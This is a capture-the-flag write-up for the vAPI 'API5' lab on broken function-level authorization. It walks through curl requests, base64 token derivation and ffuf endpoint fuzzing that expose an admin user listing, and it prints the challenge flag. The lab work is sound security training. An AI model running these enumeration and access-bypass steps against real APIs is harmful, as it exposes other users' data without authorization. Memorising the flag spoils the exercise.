> You can register yourself as a User. Thats it or is there something more? (I heard admin logins often but uses different route)

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
base64 (GNU coreutils) 9.4
echo (GNU coreutils) 9.4
GNU Wget 1.24.5
ffuf 2.1.0-dev
cat (GNU coreutils) 9.4
```

# Get User
## GET /vapi/api5/user/{api5_id}

Seeing that the Get User API endpoint uses user id, we may attempt to check for BOLA (Broken Object Level Authorization)

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: localhost' \
    $'http://localhost/vapi/api5/user/1'
```
```http
HTTP/1.1 403 Forbidden
Host: localhost
Date: Sat, 29 Jun 2024 20:27:52 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 20:27:52 GMT
Content-Type: application/json

{"success":"false","cause":"authHeaderNotSet"}
```

Seems we need an authentication header

# Create User
## POST /vapi/api5/user

Create a user
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"username\":\"testuser2\",\x0d\x0a    \"password\":\"test123\",\x0d\x0a    \"name\":\"Test User\",\x0d\x0a    \"address\":\"ABC\",\x0d\x0a    \"mobileno\":\"888888888\"\x0d\x0a}' \
    $'http://localhost/vapi/api5/user'
```
```http
HTTP/1.1 201 Created
Host: localhost
Date: Sat, 29 Jun 2024 20:22:07 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 20:22:07 GMT
Content-Type: application/json

{"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888","id":2}
```

As specified in the Postman Collection, the test script to be executed for the API5 Create User endpoint is used to derive the id by parsing the JSON, selecting the value of "id" key and updates it in the Postman Environment as api5_id, and used to derive the token (Authorization-Token) by parsing the request JSON data, taking the values of the "username" and "password" key respectively with a colon between the two values, encoding the string in base64 and updates it in the Postman Environment as api5_auth.
```js
var jsonData = JSON.parse(responseBody);
var api5_id = jsonData.id;
console.log("API 5 User ID : "+api5_id);
postman.setEnvironmentVariable("api5_id",api5_id);
var reqData = JSON.parse(request.data);
var api5_username=reqData.username;
var api5_password=reqData.password;
var api5_auth=btoa(api5_username+":"+api5_password);
console.log("API 5 Auth : "+api5_auth);
postman.setEnvironmentVariable("api5_auth",api5_auth);
```

Manually derive the authorization token
```bash
echo -n "testuser2:test123" | base64
```
```
dGVzdHVzZXIyOnRlc3QxMjM=
```
- We will need the Authorization Token for the "Get User" endpoint

# Get User
## GET /vapi/api5/user/{api5_id}

Get data of our created user
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=' -H $'Host: localhost' \
    $'http://localhost/vapi/api5/user/2'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 29 Jun 2024 20:40:36 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 20:40:36 GMT
Content-Type: application/json

{"id":2,"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888"}
```

Get data of other users
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=' -H $'Host: localhost' \
    $'http://localhost/vapi/api5/user/1'
```
```http
HTTP/1.1 403 Forbidden
Host: localhost
Date: Sat, 29 Jun 2024 20:42:01 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 20:42:01 GMT
Content-Type: application/json

{"success":"false","cause":"usernameOrPasswordIncorrect"}
```

Seems like we are not able to BOLA (Broken Object Level Authorization).
Lets try to see what objects we are able to access with a wordlist
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/objects.txt -O /home/kali/Desktop/objects.txt
```

Brute force the endpoints
```bash
ffuf -w /home/kali/Desktop/objects.txt -X GET -H "Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=" -u http://localhost/vapi/api5/§§/ -fc 500 -mode sniper -od /home/kali/Desktop/ffuf_responses -v
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/vapi/api5/§§/
 :: Wordlist         : FUZZ: /home/kali/Desktop/objects.txt
 :: Header           : Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

[Status: 200, Size: 311, Words: 6, Lines: 1, Duration: 1789ms]
| URL | http://localhost/vapi/api5/users/
| RES | ee0706e54b0d606e0a45df0a79e8f78b
    * FUZZ: users

:: Progress: [3132/3132] :: Job [1/1] :: 22 req/sec :: Duration: [0:02:21] :: Errors: 0 ::
```

View the matched fuff response file:
```bash
cat /home/kali/Desktop/ffuf_responses/ee0706e54b0d606e0a45df0a79e8f78b
```
```
GET /vapi/api5/users/ HTTP/1.1
Host: localhost
User-Agent: Fuzz Faster U Fool v2.1.0-dev
Authorization-Token: dGVzdHVzZXIyOnRlc3QxMjM=
Accept-Encoding: gzip


---- ↑ Request ---- Response ↓ ----

HTTP/1.1 200 OK
Connection: close
Cache-Control: no-cache, private
Content-Type: application/json
Date: Sat, 29 Jun 2024 21:06:25 GMT
Date: Sat, 29 Jun 2024 21:06:25 GMT
Host: localhost
X-Powered-By: PHP/7.4.33

[{"id":1,"username":"admin","name":"Admin User","address":"flag{api5_76dd990a97ff1563ae76}","mobileno":"8080808080"},{"id":2,"username":"testuser2","name":"Test User","address":"ABC","mobileno":"888888888"},
```
- Observe that we managed to access an administrative endpoint that we were not supposed to, and managed to list out all the users.

API5 Flag
```
flag{api5_76dd990a97ff1563ae76}
```

References:
https://owasp.org/API-Security/editions/2019/en/0xa5-broken-function-level-authorization/
https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/